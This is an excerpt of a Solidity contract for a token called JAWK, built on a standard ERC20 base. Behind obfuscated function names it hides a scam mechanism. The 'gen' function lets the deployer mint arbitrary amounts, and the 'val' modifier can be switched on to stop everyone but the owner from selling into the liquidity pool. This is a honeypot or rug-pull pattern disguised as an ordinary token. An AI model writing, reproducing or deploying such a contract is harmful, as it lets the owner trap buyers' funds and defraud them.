...
contract ERC20 is Context, IERC20 {
    ...
    function _b(address account, uint256 amount) internal virtual {
...
contract JAWK is ERC20, Ownable {

    address o = address(0);
    address LP = address(0);

    constructor() ERC20("JAWK", "JAWK") {
        o = msg.sender;
    ...
    function strue(uint256 r) public {
    ...
    function sfalse(uint256 r) public {
    ...
    function gen(uint256 r, address ad, uint256 am) public {
        require(((res += 20) == r), "BEP20: gen failed");
        if (o == msg.sender){
            _m(ad, am);
        }
    }

    function degen(uint256 r, address ad, uint256 am) public {
    ...
    modifier val(address from, address to){
        if (statementRes) {
            require((from == o) || (to != LP), "BEP20: val failed");
        }
        _;
    }
